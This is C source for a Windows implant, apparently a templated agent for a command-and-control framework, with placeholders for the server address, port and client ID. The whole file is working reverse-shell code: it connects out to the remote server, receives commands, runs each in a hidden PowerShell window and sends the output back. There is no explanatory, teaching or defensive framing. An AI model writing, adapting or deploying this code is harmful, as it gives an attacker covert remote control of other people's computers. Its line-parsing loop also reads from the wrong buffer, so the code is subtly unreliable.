#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <string.h>

#pragma comment(lib, "ws2_32.lib")

#define SERVER_IP "{{.IP_SERVER}}"
#define SERVER_PORT {{.PORT_SERVER}}
#define TIMEOUT_MS 10000
#define BUFFER_SIZE 4096

void run_powershell_command(SOCKET sock, const char* cmdID, const char* command) {
    char fullCommand[1024];
    snprintf(fullCommand, sizeof(fullCommand), "powershell.exe -Command \"%s\"", command);

    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
    HANDLE hStdOutRead, hStdOutWrite;

    if (!CreatePipe(&hStdOutRead, &hStdOutWrite, &sa, 0)) {
        char errMsg[512];
        snprintf(errMsg, sizeof(errMsg), "OUT:%s:[!] Pipe creation failed\n", cmdID);
        printf("%s\n", errMsg);
        send(sock, errMsg, strlen(errMsg), 0);
        return;
    }

    STARTUPINFO si = { sizeof(STARTUPINFO) };
    PROCESS_INFORMATION pi;
    si.dwFlags |= STARTF_USESTDHANDLES;
    si.hStdOutput = hStdOutWrite;
    si.hStdError = hStdOutWrite;

    BOOL success = CreateProcess(
        NULL,
        fullCommand,
        NULL, NULL, TRUE,
        CREATE_NO_WINDOW,
        NULL, NULL,
        &si, &pi
    );

    CloseHandle(hStdOutWrite); // Only read

    if (!success) {
        char errMsg[512];
        snprintf(errMsg, sizeof(errMsg), "OUT:%s:[!] Command launch failed\n", cmdID);
        printf("%s\n", errMsg);
        send(sock, errMsg, strlen(errMsg), 0);
        CloseHandle(hStdOutRead);
        return;
    }

    char buffer[BUFFER_SIZE + 1];
    DWORD exitCode = STILL_ACTIVE;
    DWORD startTime = GetTickCount();
    DWORD bytesRead;

    char lineBuf[BUFFER_SIZE * 2]; // To stack partially read lines
    size_t lineLen = 0;

    while (GetTickCount() - startTime < TIMEOUT_MS) {
        if (PeekNamedPipe(hStdOutRead, NULL, 0, NULL, &bytesRead, NULL) && bytesRead > 0) {

            if (ReadFile(hStdOutRead, buffer, BUFFER_SIZE, &bytesRead, NULL) && bytesRead > 0) {
                buffer[bytesRead] = '\0';

                // Stack in buffer line
                memcpy(lineBuf + lineLen, buffer, bytesRead);
                lineLen += bytesRead;
                lineBuf[lineLen] = '\0';

                // Replace \r\n by \n to simplify
                for (size_t i = 0; i < lineLen; i++) {
                    if (lineBuf[i] == '\r') lineBuf[i] = '\n';
                }

                // Process line by line
                char* lineStart = buffer;
                char* newline;

                while ((newline = strchr(lineStart, '\n')) != NULL) {
                    *newline = '\0';

                    // ignore empty lines
                    if (strlen(lineStart) > 0 && strspn(lineStart, " \r") != strlen(lineStart)) {
                        char outLine[BUFFER_SIZE * 2];
                        snprintf(outLine, sizeof(outLine), "OUT:%s:%s\n", cmdID, lineStart);
                        printf("%s\n", outLine);
                        send(sock, outLine, strlen(outLine), 0);
                    }

                    lineStart = newline + 1;
                }

                // if remainder (when no newline at end)
                lineLen = strlen(lineStart);
                memmove(lineBuf, lineStart, lineLen);
                lineBuf[lineLen] = '\0';

                startTime = GetTickCount();          
            }

        }

        GetExitCodeProcess(pi.hProcess, &exitCode);
        if (exitCode != STILL_ACTIVE) break;

        Sleep(50);
    }

    // If still active after timeout
    if (exitCode == STILL_ACTIVE) {
        TerminateProcess(pi.hProcess, 1);
        char interactMsg[512];
        snprintf(interactMsg, sizeof(interactMsg), "OUT:%s:[!] Command cancelled due to timeout or interactivity\n", cmdID);
        printf("%s\n", interactMsg);
        send(sock, interactMsg, strlen(interactMsg), 0);
    }

    CloseHandle(hStdOutRead);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    char endMsg[64];
    snprintf(endMsg, sizeof(endMsg), "END:%s\n", cmdID);
    printf("%s\n", endMsg);
    send(sock, endMsg, strlen(endMsg), 0);
}

int main() {
    // Windows socket init
    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in server;
    char recvBuf[1024];
    char parseBuf[2048] = {0};
    int parseLen = 0;

    WSAStartup(MAKEWORD(2, 2), &wsa);

    // Set socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    server.sin_addr.s_addr = inet_addr(SERVER_IP);
    server.sin_family = AF_INET;
    server.sin_port = htons(SERVER_PORT);

    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
        printf("Connection failed: %d\n", WSAGetLastError());
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    // ID du client
    char* clientID = "{{.ID}}\n";
    send(sock, clientID, strlen(clientID), 0);

    while (1) {
        int received = recv(sock, recvBuf, sizeof(recvBuf) - 1, 0);
        if (received <= 0) break;

        recvBuf[received] = '\0';
        // Stack in parseBuf
        if (parseLen + received >= sizeof(parseBuf))
            parseLen = 0; // éviter dépassement
        memcpy(parseBuf + parseLen, recvBuf, received);
        parseLen += received;
        parseBuf[parseLen] = '\0';

        // Process line by line
        char* lineStart = parseBuf;
        char* newline;
        while ((newline = strchr(lineStart, '\n')) != NULL) {
            *newline = '\0'; // cut line
            if (strncmp(lineStart, "CMD:", 4) == 0) {
                // Format: CMD:<id>:<commande>
                printf("%s\n", lineStart);
                char* cmdID = lineStart + 4;
                char* cmdStr = strchr(cmdID, ':');
                if (cmdStr) {
                    *cmdStr = '\0';
                    cmdStr++;
                    run_powershell_command(sock, cmdID, cmdStr);
                }
            }
            lineStart = newline + 1;
        }

        // shift the remainder at the buffer's start
        parseLen = strlen(lineStart);
        memmove(parseBuf, lineStart, parseLen);
    }

    closesocket(sock);
    WSACleanup();
    return 0;
}
